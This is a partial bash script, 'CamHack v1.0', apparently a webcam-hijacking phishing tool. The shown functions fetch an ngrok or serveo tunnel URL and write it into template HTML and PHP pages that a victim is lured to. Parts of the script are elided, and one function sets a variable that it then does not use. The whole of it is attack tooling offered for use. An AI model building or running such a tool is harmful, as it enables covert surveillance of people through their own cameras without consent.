#!/bin/bash
# CamHack v1.0
# coded by: https://github.com/sanjurtr23/sanjay-raj
...
printf " \e[1;92m C o d e d   B y  \e[0m\e[1;93m SANJAY AND RAJ \e[0m \n"


printf " \e[1;77m v1.0 Coded By https://github.com/sanjurtr23/sanjay-raj\e[0m \n"
}
...
payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' camhacking_ngrok.html > home2.html
sed 's+forwarding_link+'$link'+g' camhacking_php.php > index.php
...
serveo_payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$link'+g' camhacking_serveo.html > home2.html
sed 's+forwarding_link+'$link'+g' camhacking_php.php > index.php
sed 's+redirect_link+'$redirect_link'+g'  home2.html > home.html
}
